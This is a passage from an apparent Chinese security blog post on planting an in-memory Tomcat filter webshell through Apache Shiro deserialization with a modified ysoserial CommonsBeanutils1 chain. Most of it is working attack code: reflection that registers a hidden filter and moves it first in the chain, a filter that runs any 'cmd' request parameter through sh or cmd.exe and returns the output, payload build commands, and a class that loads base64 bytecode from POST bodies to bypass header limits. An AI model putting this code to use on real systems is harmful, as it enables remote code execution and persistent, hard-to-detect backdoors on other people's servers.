<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FilterRegistration.<span class="type">Dynamic</span> <span class="variable">filterRegistration</span> <span class="operator">=</span> applicationContext.addFilter(<span class="string">&quot;yaoa&quot;</span>, filter);</span><br><span class="line">filterRegistration.setInitParameter(<span class="string">&quot;encoding&quot;</span>, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">filterRegistration.setAsyncSupported(<span class="literal">false</span>);</span><br><span class="line">filterRegistration.addMappingForUrlPatterns(EnumSet.of(javax.servlet.DispatcherType.REQUEST), <span class="literal">false</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/*&quot;</span>&#125;);</span><br></pre></td></tr></table></figure>
<p>不过这里有一个问题，<code>context.state</code>必须等于<code>LifecycleState.STARTING_PREP</code>，可以用反射修改，添加完后再改回来。<br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636190469043-7096d320-2889-4eb3-b150-b8f3eab8333c.png" alt="image.png"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//修改state</span></span><br><span class="line">Field stateField=Class.forName(<span class="string">&quot;org.apache.catalina.util.LifecycleBase&quot;</span>).getDeclaredField(<span class="string">&quot;state&quot;</span>);</span><br><span class="line">stateField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">stateField.set(standardCtx,LifecycleState.STARTING_PREP);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">FilterRegistration.<span class="type">Dynamic</span> <span class="variable">filterRegistration</span> <span class="operator">=</span> applicationContext.addFilter(<span class="string">&quot;yaoa&quot;</span>, filter);</span><br><span class="line">stateField.set(standardCtx,LifecycleState.STARTED);</span><br><span class="line">filterRegistration.setInitParameter(<span class="string">&quot;encoding&quot;</span>, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">filterRegistration.setAsyncSupported(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">filterRegistration.addMappingForUrlPatterns(EnumSet.of(javax.servlet.DispatcherType.REQUEST), <span class="literal">false</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/*&quot;</span>&#125;);</span><br></pre></td></tr></table></figure>
<p>然后问题又来了<br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636191461274-ae27a566-8e27-407a-9a50-7d6e39ae52b7.png" alt="image.png"><br>可以看到，添加完后，<code>filterDefs</code>和<code>filterMaps</code>中都有了新添加的<code>filter</code>，但是<code>filterConfigs</code>中没有，从前面的分析中能看出来，<code>filterChain</code>是遍历<code>filterMaps</code>，然后从<code>filterConfigs</code>中找到对应的<code>filterConfig</code>，才能添加到<code>filterChain</code>中。<br>这里可以再用一次上个方法中提到的<code>org.apache.catalina.core.StandardContext#filterStart</code>函数，通过<code>filterDefs</code>来生成<code>filterConfigs</code>。<br><img src="https://oh3r-blog.oss-cn-beijing.aliyuncs.com/blog1636191866586-6444dfd8-5753-4453-aa93-0fffef0b6584.png" alt="image.png"><br>最后再调整一下<code>filterMaps</code>中的顺序，就可以了，最终的代码如下。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">org.apache.catalina.loader.<span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span>(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardCtx</span> <span class="operator">=</span> (StandardContext)webappClassLoaderBase.getResources().getContext();</span><br><span class="line">        Field applicationContextField=Class.forName(<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span>).getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">        applicationContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        ApplicationContext applicationContext=(ApplicationContext) applicationContextField.get(standardCtx);</span><br><span class="line">        <span class="keyword">if</span>(standardCtx.findFilterDef(<span class="string">&quot;yaoa&quot;</span>)==<span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">//修改state</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">stateField</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.util.LifecycleBase&quot;</span>).getDeclaredField(<span class="string">&quot;state&quot;</span>);</span><br><span class="line">            stateField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            stateField.set(standardCtx, LifecycleState.STARTING_PREP);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            FilterRegistration.<span class="type">Dynamic</span> <span class="variable">filterRegistration</span> <span class="operator">=</span> applicationContext.addFilter(<span class="string">&quot;yaoa&quot;</span>, filter);</span><br><span class="line">            stateField.set(standardCtx, LifecycleState.STARTED);</span><br><span class="line">            filterRegistration.setInitParameter(<span class="string">&quot;encoding&quot;</span>, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">            filterRegistration.setAsyncSupported(<span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">            filterRegistration.addMappingForUrlPatterns(EnumSet.of(javax.servlet.DispatcherType.REQUEST), <span class="literal">false</span>, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/*&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line">            standardCtx.filterStart();</span><br><span class="line">            <span class="comment">//获取filterMaps</span></span><br><span class="line">            FilterMap[] filterMaps=standardCtx.findFilterMaps();</span><br><span class="line">            FilterMap[] tmpFilterMaps=<span class="keyword">new</span> <span class="title class_">FilterMap</span>[filterMaps.length];</span><br><span class="line">            <span class="comment">//将恶意Filter移到第一位</span></span><br><span class="line">            <span class="type">int</span> index=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;filterMaps.length;i++)&#123;</span><br><span class="line">                <span class="keyword">if</span> (filterMaps[i].getFilterName()==<span class="string">&quot;yaoa&quot;</span>)&#123;</span><br><span class="line">                    tmpFilterMaps[<span class="number">0</span>]=filterMaps[i];</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    tmpFilterMaps[index]=filterMaps[i];</span><br><span class="line">                    index++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;filterMaps.length;i++)&#123;</span><br><span class="line">                filterMaps[i]=tmpFilterMaps[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><a name="ZiJSO"></a></p>
<h1 id="与shiro反序列化漏洞结合"><a href="#与shiro反序列化漏洞结合" class="headerlink" title="与shiro反序列化漏洞结合"></a>与shiro反序列化漏洞结合</h1><p>这里就直接看<code>ysoserial</code>工具中的源码。<br>利用<code>CommonsBeanutils1</code>这条链子<br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636192530220-57daab9a-cec6-4661-903a-b84592440dd5.png" alt="image.png"><br>跟踪到<code>Gadgets._createTemplatesImpl()_</code>函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createTemplatesImpl</span> <span class="params">( <span class="keyword">final</span> String command, Class&lt;T&gt; tplClass, Class&lt;?&gt; abstTranslet, Class&lt;?&gt; transFactory )</span></span><br><span class="line">        <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">T</span> <span class="variable">templates</span> <span class="operator">=</span> tplClass.newInstance();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// use template gadget class</span></span><br><span class="line">    <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(StubTransletPayload.class));</span><br><span class="line">    pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(abstTranslet));</span><br><span class="line">    <span class="keyword">final</span> <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(StubTransletPayload.class.getName());</span><br><span class="line">    <span class="comment">// run command in static initializer</span></span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;&quot;</span> +</span><br><span class="line">        command.replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;\\\\&quot;</span>).replace(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\\\&quot;&quot;</span>) +</span><br><span class="line">        <span class="string">&quot;\&quot;);&quot;</span>;</span><br><span class="line">    clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">    <span class="comment">// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)</span></span><br><span class="line">    clazz.setName(<span class="string">&quot;ysoserial.Pwner&quot;</span> + System.nanoTime());</span><br><span class="line">    <span class="type">CtClass</span> <span class="variable">superC</span> <span class="operator">=</span> pool.get(abstTranslet.getName());</span><br><span class="line">    clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="type">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// inject class bytes into instance</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;</span><br><span class="line">        classBytes, ClassFiles.classAsBytes(Foo.class)</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// required to make TemplatesImpl happy</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Pwnr&quot;</span>);</span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, transFactory.newInstance());</span><br><span class="line">    <span class="keyword">return</span> templates;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里用到了javassist，是用来操作java字节码的，这里的作用就是生成了一个AbstractTranslet的子类，并且在static块中注入了恶意代码。<br>最后将携带恶意代码的abstTransletAbstractTranslet类转换成byte数组的格式，存到templates的<code>_bytecodes</code>属性中。<br>这里的templates跟一下就可以看出来是<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>的一个实例。</p>
<p>理论上只要在AbstractTranslet子类的static块中插入注册Filter的恶意代码就可以了。<br>所以这里就先新建一个AbstractTranslet的子类，并且实现Filter接口（前面为了方便是直接在代码中new Filter()的形式创建的，但是我把它跟shiro结合的时候，发现这么创建不成功，原因不明，所以就这里就改了一下。），再把刚才的注册filter的代码放到static块中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.MyClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test7</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            org.apache.catalina.loader.<span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span>(org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">standardCtx</span> <span class="operator">=</span> (StandardContext)webappClassLoaderBase.getResources().getContext();</span><br><span class="line"></span><br><span class="line">            Filter filter=<span class="keyword">new</span> <span class="title class_">Test7</span>();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(standardCtx.findFilterDef(<span class="string">&quot;yaoa&quot;</span>)==<span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="comment">//添加FilterConfig</span></span><br><span class="line">                <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">                filterDef.setFilter(filter);</span><br><span class="line">                filterDef.setFilterName(<span class="string">&quot;yaoa&quot;</span>);</span><br><span class="line">                filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">                standardCtx.addFilterDef(filterDef);</span><br><span class="line">                standardCtx .filterStart();</span><br><span class="line">                <span class="comment">//添加FilterMap</span></span><br><span class="line">                FilterMap filterMap=<span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">                filterMap.setFilterName(<span class="string">&quot;yaoa&quot;</span>);</span><br><span class="line">                filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">                filterMap.setDispatcher(String.valueOf(DispatcherType.REQUEST));</span><br><span class="line">                standardCtx.addFilterMap(filterMap);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//获取filterMaps</span></span><br><span class="line">                FilterMap[] filterMaps=standardCtx.findFilterMaps();</span><br><span class="line">                FilterMap[] tmpFilterMaps=<span class="keyword">new</span> <span class="title class_">FilterMap</span>[filterMaps.length];</span><br><span class="line">                <span class="comment">//将恶意Filter移到第一位</span></span><br><span class="line">                <span class="type">int</span> index=<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;filterMaps.length;i++)&#123;</span><br><span class="line">                    <span class="keyword">if</span> (filterMaps[i].getFilterName()==<span class="string">&quot;yaoa&quot;</span>)&#123;</span><br><span class="line">                        tmpFilterMaps[<span class="number">0</span>]=filterMaps[i];</span><br><span class="line">                    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                        tmpFilterMaps[index]=filterMaps[i];</span><br><span class="line">                        index++;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;filterMaps.length;i++)&#123;</span><br><span class="line">                    filterMaps[i]=tmpFilterMaps[i];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">        <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                isLinux = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">            <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">            servletResponse.getWriter().write(output);</span><br><span class="line">            servletResponse.getWriter().flush();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在<code>Gadgets._createTemplatesImpl()_</code>中，javassist创建类的代码都删掉，通过ysoserial中提供的<code>ClassFiles._classAsBytes_</code>来将恶意类转成byte数组。<br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636194060184-dce952d0-4a3b-463a-a92b-76f9054ea76e.png" alt="image.png"><br>然后重新编译一下ysoserial。<br>mvn clean package -Dmaven.test.skip&#x3D;true <br>利用ysoserial生成payload，由于刚才改完之后，没有处理传入的cmd命令，所以cmd命令随便输就可以。<br>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 aaaa | base64 <br>将payload放到shiro利用的脚本中，生成cookie，然后起一个vulhub的docker环境，试一下。<br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636195035492-a34d02c9-8082-493c-9c9d-d3f021d7bd73.png" alt="image.png"><br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636195132598-7f5be2d8-200d-45e1-b905-32f26258e6e6.png" alt="image.png"><br>cookie太大了，超过了tomcat中的限制，这个坑下面再填。</p>
<p><a name="kLggI"></a></p>
<h1 id="解决“Request-header-is-too-large”"><a href="#解决“Request-header-is-too-large”" class="headerlink" title="解决“Request header is too large”"></a>解决“Request header is too large”</h1><p>这里我找到了两种方法。<br>1.使用post请求，利用ClassLoader加载body中的恶意类的字节码，创建一个恶意类的实例，触发static块。<br>2.修改tomcat的maxHeaderSize</p>
<p><a name="eVmhV"></a></p>
<h2 id="加载字节码"><a href="#加载字节码" class="headerlink" title="加载字节码"></a>加载字节码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.MyClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.python.antlr.ast.Str;</span><br><span class="line"><span class="keyword">import</span> sun.misc.BASE64Decoder;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="comment">/* 加载post中的字节码，绕过header头的限制，依赖spring框架*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test2</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//获得spring中的request对象</span></span><br><span class="line">            javax.servlet.http.HttpServletRequest request=((org.springframework.web.context.request.ServletRequestAttributes)org.</span><br><span class="line">                springframework.web.context.request.RequestContextHolder.getRequestAttributes()).getRequest();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">r</span> <span class="operator">=</span>request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">            r.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            javax.servlet.http.HttpSession session=request.getSession();</span><br><span class="line">            <span class="comment">//获得post的字节码，并base64解码</span></span><br><span class="line">            String c=request.getParameter(<span class="string">&quot;c&quot;</span>);</span><br><span class="line">            <span class="type">byte</span>[] classBytes=<span class="keyword">new</span> <span class="title class_">BASE64Decoder</span>().decodeBuffer(c);</span><br><span class="line">            <span class="comment">//利用反射，加载字节码，创建恶意类。</span></span><br><span class="line">            Method deLoder=ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123; <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class&#125;);</span><br><span class="line">            deLoder.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            Class cc=(Class) deLoder.invoke(Test2.class.getClassLoader(),classBytes,<span class="number">0</span>,classBytes.length);</span><br><span class="line">            cc.newInstance();</span><br><span class="line"></span><br><span class="line">            <span 